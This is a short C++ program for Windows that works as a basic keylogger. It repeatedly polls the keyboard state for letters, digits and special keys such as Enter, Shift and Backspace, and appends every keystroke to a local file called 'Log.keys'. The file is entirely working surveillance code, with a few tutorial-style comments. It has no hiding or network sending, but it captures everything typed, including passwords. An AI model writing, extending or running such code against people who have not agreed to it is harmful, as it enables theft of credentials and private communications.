#include <Windows.h>
#include <string>
#include <fstream>

void Log(std::string input) {
	std::fstream LogFile;
	LogFile.open("Log.keys", std::fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}

void LogSpecial(int input){
	switch (input)
	{
		case 8:  Log("[BACKSPACE]");break;
		case 9:  Log("[TAB]");      break;
		case 13: Log("[ENTER]");    break;
		case 16: Log("[SHIFT]");    break;
		case 17: Log("[CTRL]");     break;
		case 18: Log("[ALT]");      break;
		case 20: Log("[CAPSL]");    break;
		case 27: Log("[ESC]");      break;
		case 32: Log(" ");          break;
		case 46: Log("[DEL]");      break;
		default: Log("What?");
	}
}

int main()
{
	// See "virtual-key codes" in Microsoft Doc's.
	int SpecialKeys[10] = {8, 9, 13, 16, 17, 18, 20, 27, 32, 46};
	
	while (true) {

		// First cycle through the latin alphabet.
		for (int i = 48; i <= 90; i++)
		{
			// Check if key is pressed.
			if (GetAsyncKeyState(i) == -32767) 
			{
				Log(std::string(1, char(tolower(i))));
			}
		}

		// Then cycle through all "special" keys.
		for (int i = 0; i < 10; i++)
		{
			if (GetAsyncKeyState(SpecialKeys[i]) == -32767) 
			{
				LogSpecial(SpecialKeys[i]);
			}
		}
	}
	return 0;
}
